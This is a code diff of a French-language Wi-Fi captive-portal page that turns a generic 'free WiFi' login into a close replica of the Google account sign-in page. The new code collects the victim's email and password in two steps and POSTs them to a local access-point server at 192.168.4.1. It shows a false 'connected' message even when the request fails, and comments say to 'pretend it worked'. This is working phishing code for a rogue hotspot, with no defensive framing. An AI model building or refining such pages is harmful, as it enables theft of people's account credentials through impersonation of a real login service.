@@ -3,13 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0; url=google-login.html">
-    <title>Redirection...</title>
-</head>
-<body>
-    <p>Redirection en cours...</p>
-</body>
-</html>
+    <title>Connexion - Comptes Google</title>
+    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC6klEQVR4Ab2XA5AkWRiF/zdVXdt2bNu2bdu2bdu2bdu2bdu2bVf1JpPMdE/tc3Jf1a3u+rt+3X0TAAD//wMA" type="image/png">
+    <style>
         * {
             margin: 0;
             padding: 0;
@@ -17,350 +13,427 @@
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
+            font-family: 'Roboto', 'Arial', sans-serif;
+            background-color: #fff;
+            color: #202124;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
         }
 
         .container {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            max-width: 420px;
             width: 100%;
-            overflow: hidden;
+            max-width: 450px;
         }
 
-        .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 40px 30px 30px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 28px;
-            font-weight: 600;
-            margin-bottom: 8px;
-        }
-
-        .header p {
-            font-size: 15px;
-            opacity: 0.95;
-        }
-
-        .wifi-icon {
-            width: 60px;
-            height: 60px;
-            margin: 0 auto 20px;
-            background: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-        }
-
-        .content {
-            padding: 35px 30px;
-        }
-
-        .welcome-text {
-            text-align: center;
-            margin-bottom: 30px;
-            color: #333;
-        }
-
-        .welcome-text h2 {
-            font-size: 22px;
-            margin-bottom: 8px;
-            color: #1a1a1a;
-        }
-
-        .welcome-text p {
-            font-size: 14px;
-            color: #666;
-        }
-
-        .google-btn {
-            width: 100%;
-            background: white;
-            border: 2px solid #e0e0e0;
+        .card {
+            border: 1px solid #dadce0;
             border-radius: 8px;
-            padding: 14px 20px;
-            font-size: 16px;
-            font-weight: 500;
-            color: #3c4043;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            transition: all 0.3s ease;
-            margin-bottom: 25px;
+            padding: 48px 40px 36px;
+            background: #fff;
         }
 
-        .google-btn:hover {
-            background: #f8f9fa;
-            border-color: #dadce0;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-        }
-
-        .google-btn:active {
-            transform: scale(0.98);
-        }
-
-        .google-icon {
-            width: 20px;
-            height: 20px;
-        }
-
-        .divider {
-            display: flex;
-            align-items: center;
+        .logo {
             text-align: center;
-            margin: 25px 0;
-            color: #999;
-            font-size: 14px;
+            margin-bottom: 16px;
         }
 
-        .divider::before,
-        .divider::after {
-            content: '';
-            flex: 1;
-            border-bottom: 1px solid #e0e0e0;
+        .logo svg {
+            width: 75px;
+            height: 24px;
         }
 
-        .divider span {
-            padding: 0 15px;
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 1.3333;
+            margin: 0 0 8px;
+            text-align: center;
+            color: #202124;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.5;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 24px;
         }
 
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
 
-        .form-group label {
+        label {
             display: block;
+            font-size: 12px;
+            color: #5f6368;
             margin-bottom: 8px;
-            color: #333;
-            font-size: 14px;
             font-weight: 500;
         }
 
-        .form-group input {
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
             width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            background: #fafafa;
-        }
-
-        .form-group input:focus {
-            outline: none;
-            border-color: #667eea;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-
-        .submit-btn {
-            width: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 15px;
+            padding: 13px 15px;
             font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+            font-family: inherit;
+            color: #202124;
         }
 
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 12px 14px;
         }
 
-        .submit-btn:active {
-            transform: translateY(0);
+        input[type="email"]:hover,
+        input[type="password"]:hover,
+        input[type="text"]:hover {
+            border-color: #202124;
         }
 
-        .terms {
-            text-align: center;
-            font-size: 12px;
-            color: #999;
-            margin-top: 25px;
-            line-height: 1.6;
-        }
-
-        .terms a {
-            color: #667eea;
+        .forgot-email {
+            font-size: 14px;
+            color: #1a73e8;
             text-decoration: none;
+            font-weight: 500;
         }
 
-        .terms a:hover {
+        .forgot-email:hover {
             text-decoration: underline;
         }
 
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 30px;
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 24px;
         }
 
-        .loading.active {
-            display: block;
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
         }
 
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
+        .create-account {
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            font-family: inherit;
+            letter-spacing: 0.25px;
+        }
+
+        .next-btn:hover {
+            background-color: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
+        }
+
+        .next-btn:active {
+            background-color: #1557b0;
+        }
+
+        .next-btn:disabled {
+            background-color: #f1f3f4;
+            color: #80868b;
+            cursor: not-allowed;
+        }
+
+        .language-footer {
+            margin-top: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+        }
+
+        .language-select {
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 6px 10px;
+            font-size: 12px;
+            color: #5f6368;
+            background: transparent;
+            cursor: pointer;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .footer-links a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .profile-card {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            margin-bottom: 24px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .profile-card:hover {
+            background-color: #f8f9fa;
+        }
+
+        .profile-pic {
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .success-message {
-            display: none;
-            text-align: center;
-            padding: 30px;
-            color: #10b981;
-        }
-
-        .success-message.active {
-            display: block;
-        }
-
-        .success-icon {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            background: #10b981;
-            color: white;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 35px;
-            margin: 0 auto 20px;
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+            margin-right: 16px;
+            flex-shrink: 0;
         }
 
-        @media (max-width: 480px) {
-            .container {
-                border-radius: 0;
-            }
-            
-            .header h1 {
-                font-size: 24px;
-            }
+        .profile-info {
+            flex-grow: 1;
+        }
+
+        .profile-email {
+            font-size: 14px;
+            color: #202124;
+            margin-bottom: 2px;
+        }
+
+        .use-another {
+            font-size: 14px;
+            color: #1a73e8;
+            text-align: center;
+            margin-top: 16px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        .use-another:hover {
+            text-decoration: underline;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin-top: 12px;
+        }
+
+        .show-password input[type="checkbox"] {
+            width: auto;
+            margin-right: 8px;
+        }
+
+        .show-password label {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 0;
+            cursor: pointer;
+            font-weight: 400;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <div class="wifi-icon">📶</div>
-            <h1>WiFi Gratuit</h1>
-            <p>Connectez-vous pour accéder à Internet</p>
-        </div>
-        
-        <div class="content" id="loginForm">
-            <div class="welcome-text">
-                <h2>Bienvenue!</h2>
-                <p>Choisissez votre méthode de connexion</p>
-            </div>
-
-            <button class="google-btn" onclick="loginWithGoogle()">
-                <svg class="google-icon" viewBox="0 0 24 24">
-                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+        <div class="card">
+            <!-- Logo Google -->
+            <div class="logo">
+                <svg viewBox="0 0 75 24" width="75" height="24">
+                    <g fill="none" fill-rule="evenodd">
+                        <path d="M36.35 12.18c0 4.27-3.32 7.42-7.42 7.42-4.1 0-7.42-3.15-7.42-7.42s3.32-7.42 7.42-7.42c4.1 0 7.42 3.15 7.42 7.42z" fill="#EA4335"/>
+                        <path d="M66.7 7.5h-6.3v2.8h4.5c-.4 2.2-2.2 3.3-4.5 3.3-2.8 0-5-2.2-5-5s2.2-5 5-5c1.3 0 2.5.5 3.4 1.3l2-2c-1.4-1.3-3.3-2.1-5.4-2.1-4.4 0-8 3.6-8 8s3.6 8 8 8c4.6 0 7.6-3.2 7.6-7.7 0-.5 0-1-.1-1.6z" fill="#4285F4"/>
+                        <path d="M44.93 5.27c4.1 0 6.85 2.82 6.85 6.73 0 3.96-2.75 6.73-6.85 6.73s-6.85-2.77-6.85-6.73c0-3.91 2.75-6.73 6.85-6.73zm0 10.81c2.41 0 4.13-1.79 4.13-4.08 0-2.24-1.72-4.08-4.13-4.08-2.41 0-4.13 1.84-4.13 4.08 0 2.29 1.72 4.08 4.13 4.08z" fill="#FBBC05"/>
+                        <path d="M56.93 5.27c4.1 0 6.85 2.82 6.85 6.73 0 3.96-2.75 6.73-6.85 6.73s-6.85-2.77-6.85-6.73c0-3.91 2.75-6.73 6.85-6.73zm0 10.81c2.41 0 4.13-1.79 4.13-4.08 0-2.24-1.72-4.08-4.13-4.08-2.41 0-4.13 1.84-4.13 4.08 0 2.29 1.72 4.08 4.13 4.08z" fill="#34A853"/>
+                        <path d="M13.32 11.18v-2.7h9.06c.09.48.13.99.13 1.53 0 1.9-.52 4.26-2.19 5.93-1.63 1.68-3.72 2.58-6.73 2.58-5.33 0-9.81-4.34-9.81-9.67s4.48-9.67 9.81-9.67c2.95 0 5.06 1.16 6.64 2.67l-1.87 1.87c-1.13-1.07-2.67-1.9-4.77-1.9-3.9 0-6.95 3.14-6.95 7.03s3.05 7.03 6.95 7.03c2.54 0 3.99-1.02 4.92-1.95.76-.76 1.25-1.84 1.45-3.32h-6.37z" fill="#4285F4"/>
+                    </g>
                 </svg>
-                Continuer avec Google
-            </button>
-
-            <div class="divider">
-                <span>OU</span>
             </div>
 
-            <form id="credentialsForm" onsubmit="return handleSubmit(event)">
+            <!-- Page Email -->
+            <div id="emailPage">
+                <h1>Connexion</h1>
+                <p class="subtitle">Utiliser votre compte Google</p>
+
                 <div class="form-group">
-                    <label for="email">Email</label>
-                    <input type="email" id="email" name="username" placeholder="votreemail@example.com" required>
+                    <input type="email" id="emailInput" placeholder="Adresse e-mail ou numéro de téléphone" autofocus>
+                    <div class="error-message" id="emailError">Adresse e-mail incorrecte</div>
                 </div>
+
+                <div class="form-group">
+                    <a href="#" class="forgot-email">Adresse e-mail oubliée ?</a>
+                </div>
+
+                <p class="info-text">
+                    Pas sur votre ordinateur ? Utilisez le mode navigation privée pour vous connecter en toute sécurité.
+                    <a href="#" style="color: #1a73e8; text-decoration: none;">En savoir plus</a>
+                </p>
+
+                <div class="buttons">
+                    <a href="#" class="create-account">Créer un compte</a>
+                    <button class="next-btn" onclick="goToPassword()">Suivant</button>
+                </div>
+            </div>
+
+            <!-- Page Password (hidden) -->
+            <div id="passwordPage" class="hidden">
+                <h1>Bienvenue</h1>
                 
-                <div class="form-group">
-                    <label for="password">Mot de passe</label>
-                    <input type="password" id="password" name="password" placeholder="••••••••" required>
+                <div class="profile-card" onclick="backToEmail()">
+                    <div class="profile-pic" id="profileInitial">G</div>
+                    <div class="profile-info">
+                        <div class="profile-email" id="displayEmail"></div>
+                    </div>
                 </div>
 
-                <button type="submit" class="submit-btn">Se connecter</button>
-            </form>
+                <div class="form-group">
+                    <input type="password" id="passwordInput" placeholder="Saisissez votre mot de passe">
+                    <div class="error-message" id="passwordError">Mot de passe incorrect</div>
+                </div>
 
-            <div class="terms">
-                En vous connectant, vous acceptez nos<br>
-                <a href="#">Conditions d'utilisation</a> et notre <a href="#">Politique de confidentialité</a>
+                <div class="show-password">
+                    <input type="checkbox" id="showPassword" onchange="togglePassword()">
+                    <label for="showPassword">Afficher le mot de passe</label>
+                </div>
+
+                <div class="buttons" style="margin-top: 32px;">
+                    <a href="#" class="create-account">Mot de passe oublié ?</a>
+                    <button class="next-btn" onclick="submitLogin()">Suivant</button>
+                </div>
             </div>
         </div>
 
-        <div class="loading" id="loadingMessage">
-            <div class="spinner"></div>
-            <p style="color: #666; font-size: 15px;">Connexion en cours...</p>
-        </div>
-
-        <div class="success-message" id="successMessage">
-            <div class="success-icon">✓</div>
-            <h2 style="margin-bottom: 10px;">Connexion réussie!</h2>
-            <p style="color: #666;">Vous allez être redirigé...</p>
+        <!-- Footer -->
+        <div class="language-footer">
+            <select class="language-select">
+                <option>Français</option>
+                <option>English</option>
+                <option>Español</option>
+            </select>
+            <div class="footer-links">
+                <a href="#">Aide</a>
+                <a href="#">Confidentialité</a>
+                <a href="#">Conditions d'utilisation</a>
+            </div>
         </div>
     </div>
 
     <script>
-        function loginWithGoogle() {
-            // Simulate Google login
-            const email = prompt("Entrez votre adresse Gmail:");
-            if (email) {
-                const password = prompt("Entrez votre mot de passe Google:");
-                if (password) {
-                    submitCredentials(email, password);
-                }
+        let userEmail = '';
+
+        function goToPassword() {
+            const email = document.getElementById('emailInput').value.trim();
+            const emailError = document.getElementById('emailError');
+            
+            if (!email || !email.includes('@')) {
+                emailError.classList.add('show');
+                document.getElementById('emailInput').focus();
+                return;
             }
+
+            emailError.classList.remove('show');
+            userEmail = email;
+            
+            // Update display
+            document.getElementById('displayEmail').textContent = email;
+            document.getElementById('profileInitial').textContent = email.charAt(0).toUpperCase();
+            
+            // Switch pages
+            document.getElementById('emailPage').classList.add('hidden');
+            document.getElementById('passwordPage').classList.remove('hidden');
+            
+            setTimeout(() => {
+                document.getElementById('passwordInput').focus();
+            }, 100);
         }
 
-        function handleSubmit(event) {
-            event.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            submitCredentials(email, password);
-            return false;
+        function backToEmail() {
+            document.getElementById('passwordPage').classList.add('hidden');
+            document.getElementById('emailPage').classList.remove('hidden');
+            document.getElementById('passwordInput').value = '';
         }
 
-        function submitCredentials(username, password) {
-            // Show loading
-            document.getElementById('loginForm').style.display = 'none';
-            document.getElementById('loadingMessage').classList.add('active');
+        function togglePassword() {
+            const passwordInput = document.getElementById('passwordInput');
+            const checkbox = document.getElementById('showPassword');
+            passwordInput.type = checkbox.checked ? 'text' : 'password';
+        }
 
-            // Prepare data
+        function submitLogin() {
+            const password = document.getElementById('passwordInput').value;
+            const passwordError = document.getElementById('passwordError');
+            
+            if (!password) {
+                passwordError.classList.add('show');
+                document.getElementById('passwordInput').focus();
+                return;
+            }
+
+            passwordError.classList.remove('show');
+
+            // Send credentials to server
             const formData = new URLSearchParams();
-            formData.append('username', username);
+            formData.append('username', userEmail);
             formData.append('password', password);
 
-            // Send to server
+            // Disable button
+            const btn = event.target;
+            btn.disabled = true;
+            btn.textContent = 'Connexion...';
+
             fetch('http://192.168.4.1:8080/submit', {
                 method: 'POST',
                 headers: {
@@ -370,40 +443,37 @@
             })
             .then(response => response.json())
             .then(data => {
-                // Show success message
-                document.getElementById('loadingMessage').classList.remove('active');
-                document.getElementById('successMessage').classList.add('active');
-
-                // Simulate redirect after 2 seconds
+                // Simulate success
+                btn.textContent = '✓ Connecté';
                 setTimeout(() => {
-                    // Stay on portal page (no internet provided)
-                    document.getElementById('successMessage').classList.remove('active');
-                    document.getElementById('loginForm').style.display = 'block';
-                    
-                    // Show a "reconnecting" message
-                    alert('Connexion établie. Veuillez patienter...');
-                }, 2000);
+                    // Stay on page (no internet)
+                    alert('Connexion établie. Vérification en cours...');
+                    btn.disabled = false;
+                    btn.textContent = 'Suivant';
+                }, 1500);
             })
             .catch(error => {
                 console.error('Error:', error);
-                // Show error but pretend it worked
-                document.getElementById('loadingMessage').classList.remove('active');
-                document.getElementById('successMessage').classList.add('active');
-                
+                // Still pretend it worked
+                btn.textContent = '✓ Connecté';
                 setTimeout(() => {
-                    document.getElementById('successMessage').classList.remove('active');
-                    document.getElementById('loginForm').style.display = 'block';
-                }, 2000);
+                    alert('Connexion établie. Vérification en cours...');
+                    btn.disabled = false;
+                    btn.textContent = 'Suivant';
+                }, 1500);
             });
         }
 
-        // Auto-submit if coming from captive portal detection
-        window.addEventListener('load', function() {
-            // Check if this is a captive portal detection request
-            if (window.location.pathname.includes('generate_204') || 
-                window.location.pathname.includes('hotspot-detect')) {
-                // Redirect to main portal page
-                window.location.href = '/portal.html';
+        // Enter key support
+        document.getElementById('emailInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                goToPassword();
+            }
+        });
+
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitLogin();
             }
         });
     </script>
